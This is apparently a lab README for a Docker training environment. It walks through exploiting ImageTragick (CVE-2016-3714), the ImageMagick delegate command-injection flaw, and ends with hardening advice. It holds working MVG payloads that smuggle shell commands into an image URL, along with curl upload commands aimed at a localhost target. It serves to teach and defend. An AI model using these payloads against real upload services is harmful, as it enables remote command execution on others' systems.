# ImageMagick Delegate Injection RCE ("ImageTragick" CVE-2016-3714)

## Overview

ImageTragick (CVE-2016-3714) is an infamous remote code execution vulnerability in the ImageMagick image manipulation library (versions prior to 6.9.3-10 and 7.0.1-1). ImageMagick is integrated across millions of web applications, photo sharing sites, and CMS platforms to process profile pictures, generate thumbnails, and convert image formats.

The flaw exists within ImageMagick's delegate configuration system (`delegates.xml`). When processing certain vector and scripting formats (such as Magick Vector Graphics `.mvg`, SVG, or HTTPS URLs), ImageMagick delegates processing to external system commands (such as `wget` or `curl`) using shell interpolation without sanitizing the filename or URL parameters.

In ImageMagick delegate configuration (`/usr/etc/ImageMagick-6/delegates.xml`), the HTTPS delegate command string is defined as:

```xml
<delegate decode="https" command="&quot;curl&quot; -s -k -L -o &quot;%o&quot; &quot;https:%M&quot;"/>
```

ImageMagick substitutes `%M` with the URL string provided in the MVG directive without validating or escaping shell metacharacters. By crafting a pseudo-image containing shell metacharacters inside the `fill 'url(https://...)'` directive:

```text
fill 'url(https://example.com/image.jpg";id")'
```

ImageMagick executes the following interpolated command via `system()` / shell delegate:

```bash
"curl" -s -k -L -o "/tmp/magick-XX" "https://example.com/image.jpg";id""
```

This breaks out of the `curl` parameter and triggers arbitrary operating system command execution under the web application container context.

- **Primary Interface**: `http://localhost:8133`
- **Docker Shortcut**: `./lab start imagetragick`
- **Container Name**: `cyberlab_02_imagetragick_rce`
- **RAM Footprint**: ~100 MB (PHP 7.0 CLI Server + ImageMagick 6.9.2-10)

---

## Exploitation Walkthrough

### 1. Target Availability Check

Verify the service is running and returns HTTP 200:

```bash
curl -I http://localhost:8133/
```

### 2. Crafting the Malicious Image Payload

Create a file named `exploit.mvg` (or disguised as `exploit.jpg` or `exploit.png`):

```bash
cat << 'EOF' > exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";id")'
pop graphic-context
EOF
```

### 3. Uploading Payload via Web Form / Curl

Upload the crafted payload to the target web interface:

```bash
curl -F "file_upload=@exploit.mvg;type=image/png" \
  http://localhost:8133/
```

The application invokes `identify` via PHP `shell_exec()`, executing the injected command (`id`) and reflecting the output directly into the HTTP response:

```text
Image size is: uid=0(root) gid=0(root) groups=0(root)
640 x 480
```

### 4. Verifying File Marker Execution Inside Container

To verify out-of-band execution:

```bash
cat << 'EOF' > exploit_touch.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";touch /tmp/pwned")'
pop graphic-context
EOF

curl -F "file_upload=@exploit_touch.mvg;type=image/png" \
  http://localhost:8133/

docker exec -it cyberlab_02_imagetragick_rce ls -la /tmp/pwned
```

The file `/tmp/pwned` exists, confirming command execution.

---

## Defensive Remediation & Hardening

1. **Policy File Hardening (`policy.xml`)**:
   Disable vulnerable coder delegates in `/etc/ImageMagick/policy.xml` (or `/usr/etc/ImageMagick-6/policy.xml`):
   ```xml
   <policymap>
     <policy domain="coder" rights="none" pattern="EPHEMERAL" />
     <policy domain="coder" rights="none" pattern="URL" />
     <policy domain="coder" rights="none" pattern="HTTPS" />
     <policy domain="coder" rights="none" pattern="MVG" />
     <policy domain="coder" rights="none" pattern="MSL" />
     <policy domain="coder" rights="none" pattern="TEXT" />
     <policy domain="coder" rights="none" pattern="SHOW" />
     <policy domain="coder" rights="none" pattern="WIN" />
     <policy domain="coder" rights="none" pattern="PLT" />
   </policymap>
   ```
2. **Validate Magic Bytes**:
   Verify file header magic bytes prior to passing uploaded data into ImageMagick processing pipelines rather than trusting file extensions.
3. **Upgrade ImageMagick**:
   Upgrade ImageMagick to >= 6.9.3-10 or >= 7.0.1-1.

---

## Video Walkthroughs & Technical References

- [ImageTragick Advisory](https://imagetragick.com/)
- [Vulhub ImageMagick CVE-2016-3714 Advisory](https://vulhub.org/#/environments/imagemagick/CVE-2016-3714/)
- [Vulhub Repository ImageMagick CVE-2016-3714](https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2016-3714)
- [NIST NVD CVE-2016-3714](https://nvd.nist.gov/vuln/detail/CVE-2016-3714)
- [HackTheBox - Ariekei](https://www.youtube.com/watch?v=Pc4tzsn-ats)
